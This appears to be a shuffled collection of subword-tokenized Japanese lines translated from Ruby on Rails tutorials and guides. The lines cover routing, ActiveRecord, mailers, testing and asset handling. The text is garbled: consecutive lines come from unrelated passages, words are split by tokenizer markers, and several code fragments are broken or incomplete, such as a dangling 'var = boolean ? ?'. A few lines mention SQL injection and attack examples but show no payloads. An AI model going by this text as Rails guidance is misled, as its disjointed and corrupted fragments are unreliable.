▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 } ▖ sum ▁# ▁=> ▁ [: b , ▁2, ▁: c , ▁3 , ▁: a , ▁1 ]
▁ 生成 した メイラー ごとに 、 ビューテンプレート が 2 つ ずつ 生成されます ▟ 1 つ は テキスト メール 用の テンプレート 、1 つ は HTML メール 用 テンプレート です 。
▁Guard は 、 ファイルシステム の 変更を 監 視 し 、 たとえば \ k ode { static _ pages _ test ▖ rb } ファイル など を変更する と 自動的に テストを実行 してくれる ツール です 。
▁ 特に 、 表 \ ref { table : RESTful _ password _ resets } の最初の ルーティング では 「 forgot ▁password 」 フォーム へのリンク 作成 に 以下 を使用しています 。
▁リスト \ ref { code : user _ relationships _ association } と リスト \ ref { code : relationship _ belongs _ to } で定義した 関連付け により 、 表 \ ref { table : association _ methods } で 以前 紹 介 した ような 多くの メソッドが 使える ようになりました ▟ 今回 使える ようになった メソッドを 表 \ ref { table : association _ methods _ relationships } に示します 。
▁#### ▁ radio _ button
▁ 実行 時間 の ス ピ ー ド アップ の ため 、 別の ターミナル ウィンドウ を開いて アプリケーションのルート ディレクトリ に移動し 、 以下のように Spork サーバーを起動 します 。
▁最初の マイクロポストの ユーザーを 破 棄 した 後 、 関連する マイクロポスト も データベースから なく な った ことを確認する ことで 、 ユーザーの 破 棄 をテストする ことができます 。
▁self を省略した 結果を リスト \ ref { code : signin _ upon _ signup } に示します 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁== ▁Create Comments : ▁migrat ing ▁= ================ ================ ================
▁\ ref { sec : signup _ success } でも 説明します が 、 ユーザーの 作成 で 重要なのは \ k ode { input } ごとに ある 特殊な \ k ode { name } 属性 です 。
▁{0} 図 2▖ 6 ▁{/0}{1} ユーザー 表示 用の ページ ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) {/1}
▁もちろん 、 サブ セレクト を使用すれば い く ら でも ス ケ ー ル アップ できる など という ことはありません 。
▁ここで ` render ` メソッドは 非常に 単純な ハッシュ を引数に取り ます ▟ ハッシュの キー は ` plain ` 、 ハッシュの 値は ` params [: article ] ▖ inspect ` です 。
▁ ログイン 用 リンク が表示され なく な った ことを確認する
▁var ▁= ▁boolean ? ▁?
▁| ▁app / models / comment ▖ rb ▁| ▁ Comment モデル ▁|
▁(\ ref { sec : deploying } のとき と同じように 警 告 メッセージ が表示される ことがあります が 、 無視 して 構 いません 。
▁` Module ` の拡張
▁` attributes ` や ` connect ion ` は 関連付け に 使って はならない 名前 の例 です 。
▁ エンジン が 依 存 する gem については 、 エンジンの ルート ディレクトリ の ` ▖ gem spec ` に記述 する必要があります 。
▁ 名前 を見ると 誤 解 され が ち ですが 、\ k ode { response ▖ body } には その ページの 完全な HTML が含まれています ▁( HTML の body タグ だけで は な ありません ) 。
▁ 犯罪 的な ハ ッ カ ー にとって 、 Web アプリケーション フレームワーク の SQL インジェクション の 脆弱性 に つ け 込 み 、 テキスト テーブルの カラム に 凶 悪 な コードを 注入 して 回 る のは た ま らない 魅 力 です 。
▁この 文法 は 少々 変 わ って いて 、 混 乱 を 招 く 可能性 がある ため 、 以下のコード の動作 を理解する ようにしてください 。
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁> ▁10 ▁OR DER ▁BY ▁id ▁DESC
▁" hello "▖ at ( - 1 ) ▁# ▁=> ▁" o "
▁### ▁ 記事 を作成する
▁` public / assets / rails - a f 27 b 6 a 4 14 e 6 d a 0 000 3 50 3 1 48 be 9 b 4 0 9 ▖ png ` など 、 ファイル名 に M D 5 ハッシュ を含む ファイル への リクエスト について も同様に 扱 われます 。
▁Web アプリケーションの 開発 には 常に 困難 が つ き ま と います ▟ 他 人 の 経験 と 失敗 から 学ぶ ことも 重要です 。
▁`: default s ` を 指定した 場合 、` app / assets / javascripts ` ディレクトリに ` application ▖ js ` という ファイル があれば これも インクルード されます 。
▁ 新しいマイクロポスト フォーム のある Home ページ
▁テストにパスする 、 Help ページ 用の コード 。
▁ モデルの テストでは これまで 、 主 に \ k ode { User ▖ new } を使って きました ▟ このメソッドは 単 に メモリ 上に Ruby の オブジェクトを 作る だけです ▟ しかし 、 一意性 のテスト のために は 、 メモリ 上 だけ ではなく 、 実際に レコードを データベースに 登録 する必要があります
▁従って 、 当 時 は 以下のような 攻 撃 が 可能 になっ ていました 。
▁* ▁ コレクション 関連付けの ` delete ` メソッドは 、` Fi x n um ` や ` String ` 引数 を レコード の他に レコード ID としても 受け付け る ようになりました ▟ これにより ` destroy ` メソッド の動作 に かなり 近 く なり ました 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / group ing ▖ rb ` です 。
▁ 前 述 した ような 深 い ネスト を 避ける ひとつ の 方法 として 、 コレクション ▁( index / new / create のような 、 id を 持 た ない アクション ) ▁ だけ を 親 の スコープ の 下 で 生成する という 手法 があります ▟ このとき 、 メンバー ▁( show / edit / update / destroy のような 、 id を 必要 と する アクション ) ▁ を ネスト に含め ない のが ポイント です ▟ これにより コレクション だけ が 階層 化 のメリット を受け られます 。
▁<%= ▁comment ▖ body ▁%>
▁リスト { p 0} の {2} digest {/2} メソッドが できたので 、 有効な ユーザー を表す ユーザー フィクスチャ を作成 できるようになりました ▁( リスト \ ref { code : real _ user _ fixture }) 。
▁ 文字列 のうち 、` position ` で 指定された 位 置 から 始 ま る 部分 文字列 を返します 。
▁ 特定の 順序 に したい場合は 、\ k ode { default \_ scope } の 引数に \ k ode { order } を与え ます ▟ たとえば 、\ k ode { created \_ at } カラム の 順に したい場合は 次のようになります 。
▁この validate メソッドでは 、 引数に シンボル ▁(\ k ode { : picture \_ size }) ▁ を 取り 、 その シンボル 名 に 対応 した メソッド を呼び出します 。
▁この 説 では 、\ ref { sec : reset ting _ the _ password } で 用 いた パスワード 期限切れ の 期間 の 比 較 が 正しい ことを 証 明 します 。
▁この セクション を通して 、 複 雑 さ を 増 した フィード の実装 に 進 んで い きます 。
▁use ▁ ActionDispatch :: Cookie s
▁\ k ode { + } ▁ 演算子 を使用して 、 文字列 を結合する こともできます 。
▁TIP : ▁ _ リソース の ネスティング は 、 ぜ ひ とも 1 回 にとどめ て 下 さ い ▟ 決 して 2 回 以上 ネスト する べ き ではありません ▟ _
▁Ruby ▁API ▁ の オンライン マニュアル を見つけ て 、\ k ode { Hash } クラスの \ k ode { merge } メソッド について 読んで み てください 。
▁ あのときは \ k ode { before _ save } という コールバック を使用しました が 、 ここでは それ に よく 似 た \ k ode { before _ create } という コールバック を使用して 、 ユーザー 新規 作成 時に 記憶トークン を設定する ことにします
▁Git の 出力 には \ k ode { 34 f 06 b 7 } のような 文字列 ▁( ハッシュ ) ▁ が含まれている ことがあります ▟ Git は これら を リポジトリ の 内部 処理 に 使用 しています 。
▁最初に 、\ k ode { feature s / } ディレクトリ 内に \ k ode { signing _ in ▖ feature } という ファイル を作成します 。
▁Action ▁Mailer を使用することで 、 アプリケーションの メイラー クラス や ビューで メールを送信 することができます 。
▁ これはリスト \ ref { code : will _ paginate _ gem } で使用されていました 。
▁` re define _ method ` メソッド を使用すれば 、 必要に応じて 既存の メソッドが 削除され るので 、 このような 警 告 表示 を 抑 制 できます 。
▁\ k ode { signed _ in _ user } メソッドを セッション ヘルパー に 移動 する 。
▁この モジュール は 、` div ` などの コンテナ タグ を生成する メソッド を提供します 。
▁| ▁| ▁30 4 ▁| ▁: not _ modified ▁|
▁ リファクタリング の 第 一 歩 は 、 リスト \ ref { code : index _ view _ first _ refactoring } の ユーザーの \ k ode { li } を \ k ode { render } 呼び出し に置き換える ことです ▁( リスト \ ref { code : index _ view _ first _ refactoring }) 。
▁App Name :: Application ▖ config ▖ session _ store ▁: cookie _ store , ▁key : ▁' S O M E T H IN G N E W '
▁ ビューテンプレート が コードの 繰り返し で う ず ま って 乱 雑 になる の を避けるために 、 フォーム ・ 日付 ・ 文字列 に対して 共通の 動作を 提供する ヘルパー クラス が 多数 用意されています 。
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁images # edit ▁| ▁edit _ photo _ path (: id ) ▁|
▁ ページ の内容は 図 \ ref { fig : hello _ world _ first _ app } と まったく 同じです が 、 今 や それが イン ター ネ ッ ト 上の 本番 Web ページ として 堂 々 と 公開 されている のです 。
▁{0} 表 11 ▖2{/0} ▁{1} Microposts リソース が提供する リスト \ ref { code : demo _ microposts _ resource } の RESTful ルート {/1}
▁Active ▁Support では 、 ス ラ イ ス 操作を ハッシュ に対して 拡張 しています 。
▁上のコード に \ k ode { self } という キーワード がない と 、 要素 代入 によって \ k ode { remember _ token } という名前の \ emph { ローカル } 変数 が作成され てしまう ので 、 注意が必要です ▁( ここで 本 来 必要な のは ローカル変数 ではなく 、 インスタンス変数 です )▟ この動作 は 、 Ruby における オブジェクト 内部 への 要素 代入 の 仕 様 による ものです 。
▁ メール クライアント は Web サーバー の コンテキスト から 切り 離 されているので 、 メール に 記載 する パス では Web の アドレス の ベース URL は 補 完 されません 。
▁ エラーが表示され ている フォーム ]( images / getting _ started / form _ with _ errors ▖ png )
▁ インデックス が 配列 の サイズ より 大 き い 場合は 、 空の 配列 を返します 。
▁ ビューで すべての 本 の 属性を 表示 したい場合は 、 以下のように ERB を書く ことができます 。
▁def ▁full _ messages
▁これは 、 M ic r o s of t ▁ Internet ▁E x p l or er ▁( IE ) ▁ のバージョン が 9 より 小さい 場合 ▁(\ k ode { if ▁ lt ▁ IE ▁ 9 }) ▁ に のみ 、 囲 まれ ている 行 を実行します 。
▁ な ぜ こ ん な ことを するか という と 、 ブラウザは \ k ode { update } アクション を直接 表示する ことができ ない からです ▟ ブラウザは 、 編集 フォーム を 送信 することで 間 接 的に その アクションに 到 達 すること しか できない ので ▁( 訳 注 : ▁update は 純 粋 に 更新 処理 を行う アクション で あって 、 そこで 何か を表示する わけで は ないので ) 、 Capybara では 対応 できません 。
▁( その 意味 でも 、 RailsCast 「\ href { http :// r ailscasts ▖ com / episodes / 27 5 - how - i - test } { テスティング の 方法 } ▁( 英語 )」 を ぜ ひ 一度 参 照 してください 。
▁Rails ▁3 ▖ x で生成された 既存の 署 名 付き cookies は 、 既存の ` secret _ token ` は そのまま に して ` secret _ key _ base ` を 新しく 追加 することで 透 過 的に アップグレード されます 。
▁`: on ` オプション と `: message ` オプションは どの ヘルパー で も使用できます ▟ これらの オプションは それぞれ 、 バリデーション を実行する タイミング と 、 バリデーション 失敗 時に ` errors ` コレクション に追加する メッセージ を指定します 。
▁ その後 、 各 ユーザーに 50 のマイクロポスト ▁( ページネーション が 切り 替 わ る 30 を 超 え る 数 ) ▁ を作成し 、 Faker ▁gem の 便利な \ href { http :// ruby doc ▖ info / gem s / fa k er /1 ▖ 3▖0 / Faker / Lorem } { Lorem ▖ sentence } \ text tt { } メソッドを使って 各 マイクロポストの サンプル コンテンツ を生成します
▁{0} 図 6 ▖ 8 {/0} ▁{1} User モデルに \ k ode { password _ digest } 属性 を追加する {/1}
▁リスト { p 0} にある {2} generate {/2} コマンド の結果 のひとつ として 、\ emph { マイグレーション } と呼ばれる 新しい ファイル が生成されます 。
▁#### ▁` in _ groups ( number , ▁fill _ with ▁= ▁nil ) `
▁ 環境 設定 も 確認し 、` config ▖ action _ dispatch ▖ b est _ standard s _ support ` がある場合 は 削除します 。
▁{0} 図 11 ▖ 1 3 {/0} {1} ある ユーザープロファイル ▁(\ href { http :// localhost :3000/ users / 8 }{/ users / 6 }) ▁ に ▁[ Unfollow ] ▁ボタンが表示されている ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ unfollow _ button _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Rails は 以下の行 を含む デフォルトの ` app / assets / stylesheets / application ▖ css ` ファイル も 作成します 。
▁ 前述の ように 、\ k ode {@ user ▖ microposts ▖ count } は 、 ユーザー / マイクロポスト 関連付け を経由して 、 ある ユーザーに 属 する マイクロポストを カウント すること を 除 け ば 、\ k ode { User ▖ count } に 似 ています 。
▁# ▁Generate ▁a ▁new ▁token ▁and ▁store ▁it ▁in ▁token _ file ▖
▁#### ▁ 実際の 攻 撃 例
▁# ▁=> ▁ActiveRecord :: RecordNotFound
▁\ ref { sec : email _ in _ production } で 説明したとおり 、 アカウントの有効化 と パスワードの再設定 では 、 メールの 設定 部分 に 共通 する ところ があります ので 、 その 部分を 両 機能 に 適用 してから Git の master に マージ します 。
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁( この \ k ode { - e } オプションは 、 description の 文字列 が \ k ode {" signup ▁page "} に 一致する 例を 単 に 実行する ためのものです 。
▁最後に 、 ルーティング も エンジン 内で 分 離 されます 。
▁### ▁ 悲 観的ロック ▁( p ess im ist ic )
▁#### ▁ radio _ button _ tag
▁request ▖ remote _ ip ) ▁ }
▁ただし 、 実際に メール が 生成される わけで は \ emph { ない } のでご注意ください ▟ ここに 引 用 した のは サーバー ログ に 出力 された メール です
▁テストにパスする 必要のある 、 リスト { p 0} の \ k ode { update } アクションは 、 リスト \ ref { code : login _ upon _ signup } に示したように 、\ k ode { create } アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁本章では 多くの 分 野 をカバー し 、 約 束 どおり 、 かつ て 未 成 熟 だった アプリケーションを 、 ユーザー登録 と ログイン を フル 装 備 した Web サイトに 変 身 させ ました 。
▁### ▁ 制限 を指定する
▁def ▁run
▁Ruby では 、 メソッドが \ emph { true } または \ emph { false } という \ k ode { 論理値 ( boolean )} を返す ことを 末 尾 の 疑問符 で 示す 慣習 があります 。
▁### ▁ 使用する コントローラ を指定する
▁このメソッドは 、 リンク テキスト を 引数に と ります ▟ オプション として 次のように \ k ode { : href } パラメータ を加える と 、
▁ マッチ ャ が セグメント を パラメータ に 割り当て る 方法は 直 感 的 です 。
▁# ▁ 記 憶 した URL ▁( も しく は デフォルト値 ) ▁ に リダイレクト
▁path _ suffix ▁= ▁ qualified _ name ▖ underscore
▁これで 、 レイアウト に 第 \ ref { cha : static _ pages } 章 で作成した すべての 静的ページ へのリンク が で きました ▟ たとえば \ href { http :// localhost :3000/ about }{/ about } の場合は About ページ ▁( 図 \ ref { fig : about _ page }) ▁ に移動し ます 。
▁ ご想像 のとおり 、 これらの ファイル では JavaScript と 組み込み Ruby ▁( ERb ) ▁ を ミ ッ ク ス して 現在の ページ に対する アクション を実行する ことができます 。
▁foreign _ key : ▁" manager _ id "
▁その 際 、 表 2▖1 \ ref { table : user _ url s } に記載されている 、 ページ と URL の関係 を参照 すると わかりやす い と思います 。
▁### ▁Active ▁Record
▁それでは マイグレーション を実行し ましょう 。
▁ 警 告 が表示され ても 大 した ことはありません が 、 邪 魔 に 思える こともあります 。
▁以下は 、 ある RESTful ルーティング に対して ` rake ▁routes ` を 実行 した結果 から 抜 粋 した ものです 。
▁この テストでは 、 与えられた 要素 が 配列 に含まれている かどうか をチェックする \ k ode { include ?} メソッド を使用しています
▁ umerate }╼╼ ▁% ▁subsection ▁ unsuccessful _ edit s ▁( end )╼╼ ▁\ subsection { 編集 失敗 時の テスト } ▁% ▁( fold )╼ ▁\ label { sec : testing _ unsuccessful _ edit s }╼╼
▁ パラメータ 名を `: user name ` に したくない場合 は 、 ルーティング 定義 の `: user name ` の 部分 を変更 してください 。
▁ 今は この ルーティング を 完全に 理解 できる 必要はありません ▟ それ でも この リスト を 何 と なく 眺 めて み れば 、 アプリケーションで サポート されている 全 アクション が この リスト にある ことに気付く と思います 。
▁ レコードを 更新 できない よう ロック する
▁#### # ▁` order `
▁ 表 \ ref { table : association _ methods _ relationships } の メソッド を参考に しながら 、\ k ode { following } による 関連付け を使って \ k ode { follow }、\ k ode { unfollow }、\ k ode { following ?} メソッドを 実装 し ていきましょう ▁( リスト \ ref { code : follow _ unfollow _ following }) 。
▁#### ▁` parent s `
▁\ k ode { create \_ table } メソッドは ブロック 変数 を 1 つ 持つ ブロック ▁(\ ref { sec : block s }) ▁ を受け取り ます ▟ ここでは ▁( “ table ” の 頭 文字 を 取 って ) ▁\ k ode { t } です 。
▁* ▁ コントローラ と同様 、 メイラー クラスの メソッド にも フィルタ 付き の ブロック または シンボル を 1 つ 指定 することができます 。
▁git ▁commit : ▁% Q { ▁- m ▁' Initial ▁commit ' ▁ }
▁# ▁</ contributors >
▁ 例 の メールアドレス 入 り リンク のおかげで 、\ k ode { edit } アクション で メールアドレスを 取り出す のは 問題ありません ▟ しかし フォームを送信すると この 値は 消え てしまいます ▟ この 値は ど こ に 保 持 しておく のが よい のでしょうか 。
▁特定の属性にアクセスするための 、 種類 が " email " の input タグを返します 。
▁ V im ▁ は 無 償 で 手 に 入 ります が 、 S ublime ▁Text ▁ は 有 償 です ▁( 訳 注 : ▁ただし 、 無料 の 試 用 期間 に 制限 はありません )▟ どちらも プロ の 開発者 が 使 っている エディタ ですが 、 私 の 経験 では 、 S ublime ▁Text ▁ の方が 初心者 にとって \ emph { は る か に } 扱 い やすい エディタ だと 言えます 。
▁` form _ for ` ヘルパーメソッド の最初の パラメータ には `@ article ` のような オブジェクト を使用できます ▟ `@ article ` のような オブジェクトが 最初の パラメータ として 渡される と 、 ヘルパーは その パラメータ に含まれている フィールド を使用して フォームの 項目 を 埋 め ます 。
▁=> ▁" H ar t l "
▁module ▁Fix t ure File Helpers
▁たとえば 、 ERB テンプレート システム を使用する HTML ファイルの 拡張子 は ` ▖ html ▖ erb ` になります 。
▁続いて リスト \ ref { code : sample _ app _ readme } の内容を README に 記 入 します 。
▁ 一 週 間 経 って も 何 の 音 沙汰 も ない ような ら 、 少し つ っ つ い てみましょう 。
▁` config / database ▖ yml ` ファイル には 、 Rails が デフォルトで 実行 できる 3 つの 異なる 環境 を 記 述 する セクション が含まれています 。
▁ 通常 は 文字列 または シンボル になります 。
▁まずは ユーザーが 自分の プロファイル を 自分で 更新 できるようにします ▟ ここで 早速 第 \ ref { cha : log _ in _ log _ out } 章 で実装した 認 証 用の コード を使います が 、 これは 認可 モデル について 説明 する 自然な キ ッ カ ケ になります 。
▁Client ▖ maximum (" age ")
▁` stylesheet _ link _ tag ` ヘルパーは 、 提供され た ソース ごとに HTML ▁`< link >` タグを返します 。
▁この節では 、 いよいよ \ href { http :// www ▖ answer s ▖ com / p en ultimate } { 最 後 から 2 番目の } ユーザー アクション である \ k ode { index } アクション を追加しましょう ▟ この アクションは 、\ emph { すべての } ユーザーを 一覧 表示 します 。
▁* ▁ ORM ▁( オブジェクト リ レ ー シ ョ ナ ル マッピング ) ▁ と Active ▁Record について 、 および Rails での 利用 方法
▁さらに 、 メールアドレスを ユーザーがログイン するとき の 一意 の ユーザー名 として 使 お う と している ので 、 メールアドレスが データベース 内で 重複 すること の ないようにする 必要もあります 。
▁Micropost ▁ マイグレーション を実行し 、 テスト データベース を 準備 することで 、 これらの テストをパスさせ ることができます 。
▁create _ table ▁: ph y s ic i an s ▁do ▁| t |
▁ ローカル での コンパイル を行なう ことで 、 コンパイル 済み の アセット ファイルを Git など による ソース 管理 対象 に含め 、 他の ファイル と 一 緒 に デプロイ できるようになります 。
▁上の ` collection ▖ create ` と同じ ですが 、 レコードが invalid の 場合に ` ActiveRecord :: RecordInvalid ` が raise される 点 が異なります 。
▁### ▁ ハッシュ キー の 操作
▁--------- ---------------- -
▁ 最後の 2 つの 結果は 同 等 である ことにご注目ください ▟ なお 、 著者 は 後者の 式 展開 の方が 好 み です ▟ 空白 を \ k ode {" ▁" } のように 直接 加 え る のは どう も ぎ こ ち なく 思 えます 。
▁以下の 同等の コード に置き換え ました 。
▁ユーザー 表示 ビュー に 名前 と Gravatar を表示する
▁" Time " ▁=> ▁" datetime "
▁WARNING : ▁ キー は 通常 は ユ ニ ー ク で なければなりません 。
▁( Rails ▁2▖ x に 慣 れ ている 方は 、\ k ode { form _ for } では コンテンツ を挿入 するときに ▁“ %= ” ▁ を使用する ERb 方 式 の 文法 を使用している ことに注意してください 。
▁これは CRUD で い う " C " ▁( 作成 ) ▁ と " R " ▁( 読み出し ) ▁ の 操作 に相当 します 。
▁[ ` form _ for ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / Form Helper ▖ html # method - i - form _ for ) ▁ は フォーム 作成 を 支 援 する ヘルパー です 。
▁最初の アプリケーション のときと同様に 、 まずは アプリケーションのルート ディレクトリ にある \ k ode { README } ファイルを 更新 して 、 具体的な 作業 内容 を わかりやすく 記 入 しておく ことをおすすめします 。
▁リスト \ ref { code : valid _ user _ test } では 、 シンプルな \ k ode { assert } メソッドを使って テスト します ▟\ k ode {@ user ▖ valid ?} が \ k ode { true } を返す と 成功 し 、\ k ode { false } を返す と 失敗します 。
▁#### ▁javascript _ tag
▁ silence _ warning s ▁ { ▁Object ▖ const _ set ▁" RAILS _ D E F A U L T _ LO G G ER ", ▁ logger ▁ }
▁ _ ▁ エスケープ が必要になる のは 、 管理画面 で User - A g ent ヘッダ を表示する 場合 など が考えられます 。
▁( { p 0} で Application コントローラに {2} hello {/2} アクション を追加した 場合は 、 今のうちに アクション を削除し ておく ことをおすすめします ) 。
▁length : ▁ { ▁ minimum : ▁5 ▁ }
▁\ ref { sec : image _ validation } で 見た ように 、 jQuery ライブラリ には DOM 操作 用の 膨大な メソッドが 提供され ています が 、 ここで 使用する のは わずか 2 つ です 。
▁\ href { http :// n ode js ▖ org /}{ N ode ▖ js } が 特に お勧め です ▟)
▁ ビュー は 、 コントローラ が 作成した 情報 に対して 余 計 な ことを せずに 表示 する必要があります 。
▁ 一般的な ア ド バ イ ス
▁それでは いつものように 、 Git で 新 機能 用の トピックブランチを作成 しましょう 。
▁d ▖ monday ▁# ▁=> ▁Mon , ▁0 3 ▁May ▁2010
▁User ▖ where ( id : ▁1) ▖ joins (: articles )▖ explain
▁| ▁GET ▁| ▁ / photos / new ▁| ▁photos # new ▁| ▁ 写 真 を 1 つ 作成 するための HTML フォーム を返す ▁|
▁real 	 0 m 2▖ 64 9 s
▁このオプション が true になっている と 、 ダイジェスト が生成され て アセット への URL に含まれる ようになります 。
▁ここで \ k ode { : page } パラメータ ー には \ k ode { params [: page ]} が使用されています が 、 これは \ k ode { will _ paginate } によって自動的に 生成されます 。
▁ モデルの 継 承 関係 と同様に 、 Users コントローラ も Microposts コントローラ も 最終的に は \ k ode { ActionController :: Base } を継承し ており 、 モデルオブジェクト の 操作 、 イン バ ウ ンド HTTP ▁request の フィルタ 、 ビューを HTML として 出力する などの 多 彩 な 機能を 実行 できる ようになっています 。
▁たとえば New s レイアウト で 新しい レイアウト を使用する ために 、` render ▁template : ▁' layouts / new s ' ` 経由で ` ActionView :: render ` メソッド を使用することもできます 。
▁ 123 ▖ to _ s (: human _ size ) ▁# ▁=> ▁ 123 ▁By te s
▁def ▁ attr _ internal _ reader (* attr s )
▁# ▁instance ▁variable ▖
▁WARNING : ▁ アセット の プリコンパイル を行って いる場合 ▁( [ production 環境 の場合 ](# production 環境 の場合 ) 参 照 ) 、 存在しない アセット へのリンク を含む ページ を呼び出す と 例外が発生します 。
▁{0}{1} リスト 2▖1 3 {/1}{/0} と {2}{1} リスト 2▖1 4 {/1}{/2} を 比較してみると 、 User モデルと Micropost モデル は いずれも \ k ode { ActiveRecord :: Base } という クラス を継承し ています ▁( 継 承 関係 は \ k ode { < } 記 号 で 表現 されています )▟ この クラスは 、 ActiveRecord が提供する ベース クラス であり 、 クラス 間 の リレーション は { 4 } {1} 図 2▖1 6 {/1} {/4} のようになります 。
▁ まとめると 、 {0}{1} 第 6 章 {/1}{/0} から {2}{1} 第 10 章 {/1}{/2} を通して 、 Rails の ログイン と 認証システムを ひ と とおり 開発 します 。
▁ ちなみに \ href { https :// github ▖ com / carrierwave uploader / carrierwave # using - mini magic k } { CarrierWave の MiniMagick の 項目 } を見ると 、 ▁ 小 さ すぎる 画像 を \ emph { 引 き 延 ば す } ことも できる よう ですが 、 今回は 使い ません 。
▁図 \ ref { fig : home _ with _ form } の フォーム が正しく 動作 している かどうかを確認 したい場合 、 正しい エントリ ー を 投 稿 した 後 、\ href { http :// localhost :3000/ users /1 } { プロフィール ページ } に移動し て ポスト を 表示 すればよいのです が 、 これは かなり 面倒な 作業 です 。
▁ ユーザー登録ページ の ルート
▁* ▁ 値が ハッシュ のとき 、 キーを `: root ` として 再帰的 な 呼び出し を行います 。
▁ こういった リクエスト の種類 によって 応答 を 場合 分 け するとき は 、\ k ode { respond \_ to } メソッド という メソッド を使います 。
▁def ▁process ( action , ▁params = nil , ▁session = nil , ▁flash = nil , ▁ http _ method =' GET ')
▁first _ name : ▁' Andy ')
▁< h 2 > Comments </ h 2 >
▁< title > Welcome !
▁ユーザー 一覧 の 2 ページ 目
▁ このコード によって 、 外部 にある 任意の HTML や JavaScript が 読み 込 まれ 、 Web サイト の一部 として 埋 め 込 まれ ます 。
▁` utc ?` 述 語 は 、 レシーバ が その タイムゾーン に 合 った UT C 時刻 を持っている かどうかをチェックします 。
▁\ k ode { update _ attributes } メソッドは \ k ode { update } メソッドの エイリアス ですが 、 単 一 属性 を変更する \ k ode { update _ attribute } メソッドと の違い を 明 確 に するために 、 筆者 は 長い メソッド名 の方 を 好 んで 使 っています 。
▁ 以下のように 書き 換 え 、
▁ リレーションシップ の モデル で 何か 特別な ことを する必要が まったく ない のであれば 、 結合 モデルの 不要な ` has _ and _ belongs _ to _ many ` リレーションシップ を使用する のが シ ン プ ル です ( ただし 、 こちら の場合は 結合 モデル が 不要な 代わりに 、 専 用の 結合テーブル を 別 途 データベースに 作成 しておく必要があります ので 、 お 忘れ な き よう ) 。
▁HTTP /1▖1 ▁200 ▁OK ▁ Server : ▁Co w bo y
▁従って 、1 ページ 目 は 1 から 30 のユーザー 、2 ページ 目 は 3 1 から 60 のユーザー という 具 合 に データ が 取り 出 されます ▟ ページ が \ k ode { nil } の場合 、 ▁\ k ode { paginate } は 単 に 最初の ページ を返します 。
▁ モデルの XML シ リ ア ラ イ ザ では この メソッドを使用して ノード 名を ダ ッ シ ュ 化 しています 。
▁` config / database ▖ yml ` ファイル には ERB タグ ` <%= ▁%> ` を含め ることができます 。
▁図 \ ref { fig : user _ profile _ with _ microposts } では 最初の ユーザーの プロフィール画面 を 、 図 \ ref { fig : other _ profile _ with _ microposts } では 2 番目の ユーザーの プロフィール画面 を表示し ています 。
▁\ href { http :// www ▖ got ealeaf ▖ com / railstutorial } { T ealeaf ▁A c a de my } : ▁ 開発者 自身 による 新 人 向 け ト レ ー ニ ング 講 座 が 最 近 増え てきました ▟ 身 の 回 り の そう い った 人 が い れば よい のですが 、 そうでない 場合は オンライン で どこか ら でも 受 講 できる \ href { http :// www ▖ got ealeaf ▖ com / railstutorial } { T ealeaf ▁A c a de my } があります 。
▁もちろん 、 些 細 な リファクタリング で しか ないので 、 テストは {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} した まま になっている はずです 。
▁ただし ここで \ emph { 重大な } 警 告 があります ▟ 以下の 文 面 は 流 し 読み せず 、 必ず 注意 深 く 読んで ください 。
▁C : \ Site s \ sample _ app
▁このコードは リスト \ ref { code : generated _ account _ activation _ view _ text } で使用されていました ▟ もうひとつ 、
▁ 関連付けられたオブジェクト が ない場合は 、 空の 配列 を 1 つ 返します 。
▁ あのときは 、\ k ode { before \_ save } コールバック に \ k ode { downcase } メソッドを バ イン ド しました ▁( リスト \ ref { code : email _ downcase }) 。
▁#### ▁ コピー
▁** ▁`: table _ name ` を指定すると 、 たとえば Customer クラスの 主キー は ` customer id ` になります
▁# ▁=> ▁false
▁\ k ode {@ } 記 号 で始まる 変数 は Ruby では \ emph { インスタンス変数 } と呼ばれ ます ▟ ビューで は自動的に これらの インスタンス変数 を使用できます ▟ この場合 、 {2} {3} リスト 2▖ 7 {/3} {/2} の \ k ode { index ▖ html ▖ erb } ビュー は 、\ k ode {@ users } の 一覧 を 並 べ 、1 行 ごとに HTML の 行 として 出力 します
▁上のコードでは 、 Rails の慣習 によって \ k ode { id : ▁@ user } という 引数 が自動的に \ k ode {@ user ▖ id } に変換 されています ▁( これは コントローラで リダイレクト した ときと同様 です ) 。
▁getting _ users ▁( end )╼╼ \ subsection { 2 つの 目 立 た ない バグ } ▁% ▁( fold )╼\ label { sec : two _ subtle _ b ug s }╼╼
▁まずは 、 プロフィール画面 用の 統合テスト を生成し てみましょう 。
▁form _ for ▁@ geocoder , ▁url : ▁ geocoder _ path ▁do ▁| f |
▁上の 説明 が 暗 に示すように 、 これ から SQL クエリ に \ emph { もう 1 つ } の \ k ode { user \_ id } を追加します 。
▁M ac ▁OS ▁X または Windows を使用している場合 は 、 OS に JavaScript ランタイム をインストール してください 。
▁resources ▁: articles
▁ 有 力 な 候 補 として さまざまな もの が考えられます が 、 基本的に は 一意性 を 確 保 できる 、 長 く て ランダム な 文字列 で さ え あれば どんな もの でも 良い でしょう 。
▁ / / ]] >
▁ メソッドを 組み込み クラス に 追加 できる 柔 軟 性 の 高 さ のおかげで 、 純 粋 な Ruby を 極めて 自然に 拡張 することができます ▁( もちろん 注意 して 使う 必要 は あります が ) 。
▁ 私 た ち の アプリケーション 設計 では 、\ emph { 永続的 な } セッション を採用し ます ▟ つまり 、 ブラウザを閉じ た 後に も サインイン 状態 を 保 持 する ということ であり 、 サインイン した ユーザー に対して 何らかの \ emph { 恒久 的な } 識 別 子 を使用する必要があります 。
▁まずは コンソール から 脱 出 してください ▁( Ctrl - C )
▁ 試 し に 、 先ほど 作成した user オブジェクトに対して 間違った パスワード を与え てみましょう 。
▁#### ▁ ローカル変数
▁<%= ▁render ▁partial : ▁" product ", ▁object : ▁@ item ▁%>
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁users ▁| ▁ const ▁| ▁PR IM A RY ▁|
▁Rails ルート で使用する Microposts リソース 用の ルール
